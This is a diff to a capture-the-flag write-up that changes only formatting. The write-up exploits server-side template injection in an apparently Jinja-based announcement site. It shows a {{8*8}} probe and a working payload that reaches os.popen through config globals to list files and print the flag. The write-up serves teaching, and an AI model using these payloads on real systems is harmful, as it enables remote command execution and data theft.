@@ -12,7 +12,7 @@ I made a cool website where you can announce whatever you want! Try it out! I he
 
 **Write-up**
 
-Simple SSTI vulnerability. Tested template injection with the usual payload `{{8*8}}`. 
+Simple SSTI vulnerability. Tested template injection with the usual payload {{8*8}}. 
 ![alt text](image-3.png)
 
 Did not bother testing which template engine is, guessed it is `jinja`.
@@ -20,7 +20,7 @@ Did not bother testing which template engine is, guessed it is `jinja`.
 Used the payload {{config.__class__.__init__.__globals__['os'].popen('ls').read()}} to find files in local directory:
 ![alt text](image-2.png)
 
-Using same process from above, printed the flag with the command {{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}.
+Using same process from above, printed the flag with the command `{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}`.
 ![alt text](image-4.png)
 
 **Solution**
